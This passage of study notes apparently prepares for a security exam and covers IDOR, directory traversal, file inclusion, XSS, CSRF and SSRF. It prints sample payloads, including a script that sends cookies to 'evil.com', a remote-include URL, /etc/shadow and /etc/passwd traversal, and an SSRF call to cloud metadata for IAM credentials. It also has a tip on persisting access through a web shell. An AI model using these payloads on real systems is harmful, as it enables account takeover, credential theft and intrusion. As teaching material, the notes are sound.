    * Example: `example.com/login?login_ok=https://evilsite.com`, then after login it might call `https://evilsite.com?csrf_token=<somevalue>` or the `Referer: https://bank.com/transfer?sessionid=abc123&csrf_token=xyz789` header

### Exploiting Authorization Vulnerabilities

* **Insecure Direct Object References**
  * `example.com/orders?id=100` shows your order and you can just do `example.com/orders?id=101` and see anothers order.
* **Directory Traversal**
  * The web server allows to navigate the directory and list all files - bad configuration
    * Appache Server / NGINX - `www.example.com/../../../etc/shawdow` (so you just path yourself outside the web folder)
    * Open AWS S3 bucket
    * It helps to know on what server the site is host to then learn about their (Default) config
* **File Inclusion**
  * Next level Directory Traversel - you don't just read a file, you execute it
  * Run a file from the server's file system: `www.example.com/?include=../../../etc/attack.sh`
  * Run a file from an external place: `www.example.com/?include=www.evilsite.com/script.sh`
  * Attack might then upload a [Web Shell](https://en.wikipedia.org/wiki/Web_shell) to comfortably run commands and see output
    * ✅ The webshell uses HTTPS, so it hides even better.
  * TIP: Patch the vulnerability and persist your access with the web shell
* **Privilege Escalation**
  * Upgrade your user to have more rights or higher group
  * Dirty Cow - Linux vulnerability

### Exploiting Web Application Vulnerabilities

* **Cross-Site Scripting XSS** - when an attacker does HTML injection (inject their own HTML into a webpage)
  * **Reflected XSS**
    * When an application allows *"reflected input"*
    * Anywhere, where a user can provide "input" that later would be viewed by another user there is a XSS oppertunity.
    * Example `https://news.com/search.php?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>` assuming that the search page would (without validation) render the search query `q` in the html (`Search results for q`.)
  * **Stored/Persistent XSS**
    * Here the XSS script is stored server/side
    * Example: I leave a product review with content `Good product! <script>alert('oi')</script>`
      * If this input is not sanatized or cleaned, it will store this string in the database.
      * When someone else views the product, and all comments are rendered underneath, the `<script>alert('oi')</script>` part will be seen as actual HTML and the script tag will execute.
      * Now you can replace `alert('oi')` with javascript that will log your keys, steal your cookies, etc... cause you are now runng a script under the domain of the trusted site.
    * ⚠️ Think of other ways where you can "inject HTML" on the request route or from a browser plugin.
    * Solutions
      * Input validation and escaping
      * [OWASP Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
* **Request Forgery**
  * Exploit trust relationships and try users to unwittingly execute commands against a remote server, there are 2 types.
  * **Cross-Site Request Forgery CSRF/XSRF**
    * Assume you are logged in to `mybank.com`.
    * You then visit a dangerous site or link `evil.com`
    * When you click on a button on `evil.com` it might trigger a request to `mybank.com`
    * If you are stil loggedin to `mybank.com`, the request could succeed because the browser would use any cookies linked to the `mybank.com` site.
    * Example HTMl on the `evil.com` site
    ```html
        <!-- Hidden on evilsite.com -->
        <form action="https://mybank.com/transfer" method="POST" id="malicious-form">
            <input type="hidden" name="to_account" value="999999">
            <input type="hidden" name="amount" value="5000">
            <!-- Note: no CSRF token! -->
        </form>

        <script>
            // Automatically submit when page loads
            // document.getElementById('malicious-form').submit();
        </script>
    ```
    * Defenses: secure tokens, check in reffering url to only accept urls that originate from own domain.
  * **Server-Side Request Forgery SSRF**
    * Here we want the server/back-end to make an web call to a url.
    * Let's say you have a web application that takes an URL as input
    * That URL would be used to fetch remote information, and it would return that in some form.
    * Imagine for that URL, you specifcy a URL or IP address that would be not publicly available, but only to your back-end server
    * Example: `GET /preview?url=http://localhost:8080/admin/users`
    * Example: `GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` on AWS exposes IAM credentials
    * Example: `GET /preview?url=file:///etc/passwd`

### Application Security Controls

* **Input Validation**
* **Web Application Firewalls**
* **Parameterized Queries**
* **Sandboxing**
* **Code Security**

### Secure Coding Practices

* **Source Handling Comments**
* **Error Handling**
* **Hard-Coded Credentials**
* **Package Monitoring**
* **Memory Management**
* **Race Conditions**
* **Unprotected APIs**

### Automation and Orchestration

* **Use Cases of Autmation and Scripting**
* **Benefits of Automation and Scripting**
* **Other Considerations**
